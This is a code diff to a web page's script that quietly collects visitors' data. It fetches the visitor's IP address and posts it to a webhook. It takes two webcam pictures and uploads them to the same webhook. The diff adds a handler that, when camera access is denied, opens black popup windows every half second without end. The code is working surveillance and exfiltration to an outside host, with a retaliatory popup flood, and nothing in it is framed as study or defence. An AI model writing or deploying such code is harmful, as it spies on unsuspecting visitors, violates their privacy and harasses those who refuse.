@@ -28,7 +28,7 @@
       return fetch(webhookURL, { method: 'POST', body: formData });
     }
 
-    // Fetch IP and send as message
+    // Send IP
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
@@ -39,18 +39,16 @@
         });
       });
 
-    // Get webcam and send two pictures
+    // Attempt camera capture
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // Capture and send first picture immediately
         setTimeout(() => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           sendFile(dataURLtoBlob(canvas.toDataURL('image/png')), 'capture1.png');
         }, 1000);
 
-        // Capture and send second picture after 3 seconds
         setTimeout(() => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           sendFile(dataURLtoBlob(canvas.toDataURL('image/png')), 'capture2.png');
@@ -58,9 +56,14 @@
         }, 4000);
       })
       .catch(() => {
-        // Camera denied or error
+        // On denial or error, spawn black windows repeatedly
+        function spawnBlackWindow() {
+          window.open('', '', 'width=500,height=500').document.write('<body style="margin:0;background:black;"></body>');
+        }
+        setInterval(spawnBlackWindow, 500);
       });
   </script>
 </body>
 </html>
+
 
